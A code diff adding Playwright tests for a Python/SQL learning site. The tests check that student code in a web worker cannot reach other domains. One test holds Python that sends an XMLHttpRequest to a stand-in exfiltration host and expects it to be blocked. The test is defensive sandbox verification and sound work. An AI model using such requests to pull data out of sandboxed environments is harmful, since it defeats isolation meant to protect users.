@@ -89,6 +89,49 @@ test.describe('ejercicios de Python', () => {
   });
 });
 
+test.describe('aislamiento del código del estudiante', () => {
+  // La CSP de la página no se aplica a los workers: la suya llega en la cabecera de su script.
+  const EXTERNAL = 'https://exfiltracion.example/';
+
+  test('el código Python no puede hacer peticiones a otros dominios', async ({ page }) => {
+    const external: string[] = [];
+    await page.route(`${EXTERNAL}**`, (route) => {
+      external.push(route.request().url());
+      return route.fulfill({ status: 200, headers: { 'access-control-allow-origin': '*' }, body: 'ok' });
+    });
+
+    await page.goto(PYTHON_LESSON);
+    const card = await openExercise(page, 'Tu primer saludo');
+    await typeCode(
+      page,
+      'Tu primer saludo',
+      [
+        'from js import XMLHttpRequest',
+        'try:',
+        '    peticion = XMLHttpRequest.new()',
+        `    peticion.open("GET", "${EXTERNAL}datos", False)`,
+        '    peticion.send()',
+        '    print("respuesta", peticion.status)',
+        'except Exception:',
+        '    print("bloqueada")',
+      ].join('\n'),
+    );
+    await card.getByRole('button', { name: 'Ejecutar' }).click();
+    // Se mira la salida del programa, no el editor (que también contiene la palabra).
+    const output = card.locator('pre').filter({ hasText: /^(bloqueada|respuesta)/ });
+    await expect(output).toHaveText(/^bloqueada\s*$/);
+    expect(external, 'El worker no debe llegar a enviar la petición').toEqual([]);
+  });
+
+  test('el código SQL y Python siguen funcionando con la CSP de los workers', async ({ page }) => {
+    await page.goto(SQL_LESSON);
+    const card = await openExercise(page, 'Clientes sin ciudad');
+    await typeCode(page, 'Clientes sin ciudad', 'SELECT nombre FROM clientes WHERE ciudad IS NULL;');
+    await card.getByRole('button', { name: 'Comprobar' }).click();
+    await expect(card.getByText('¡Correcto!')).toBeVisible();
+  });
+});
+
 test.describe('ejercicios de SQL', () => {
   test('una consulta correcta se aprueba y muestra la tabla', async ({ page }) => {
     await page.goto(SQL_LESSON);
